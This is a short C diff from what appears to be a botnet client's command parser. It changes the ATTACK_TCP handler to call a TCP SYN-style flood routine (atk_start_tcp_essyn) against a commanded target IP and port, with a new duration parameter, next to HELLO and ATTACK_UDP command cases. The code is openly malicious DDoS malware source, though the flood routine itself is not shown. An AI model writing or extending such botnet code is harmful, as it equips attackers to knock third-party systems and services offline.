@@ -86,11 +86,11 @@ static void parse_command(struct command *cmd)
     case HELLO:
         break;
     case ATTACK_TCP:
-        start_attack(ip_to_string(cmd->data.target.o1,
-                                  cmd->data.target.o2,
-                                  cmd->data.target.o3,
-                                  cmd->data.target.o4),
-                     cmd->data.port);
+        atk_start_tcp_essyn(ip_to_string(cmd->data.target.o1,
+                                         cmd->data.target.o2,
+                                         cmd->data.target.o3,
+                                         cmd->data.target.o4),
+                            cmd->data.port, cmd->data.duration);
         break;
     case ATTACK_UDP:
         break;
